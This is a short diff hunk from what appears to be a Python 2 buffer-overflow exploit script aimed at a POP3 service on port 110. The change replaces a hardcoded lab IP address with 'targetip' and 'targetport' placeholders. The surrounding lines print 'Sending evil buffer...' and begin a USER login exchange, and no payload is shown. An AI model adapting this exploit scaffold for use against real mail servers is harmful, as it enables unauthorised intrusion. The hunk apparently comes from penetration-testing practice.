@@ -81,7 +81,7 @@ s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 try:
 	print "\nSending evil buffer..."
-	s.connect(('10.11.13.8',110))
+	s.connect(('targetip',targetport))
 	data = s.recv(1024)
 	s.send('USER username' +'\r\n')
 	data = s.recv(1024)
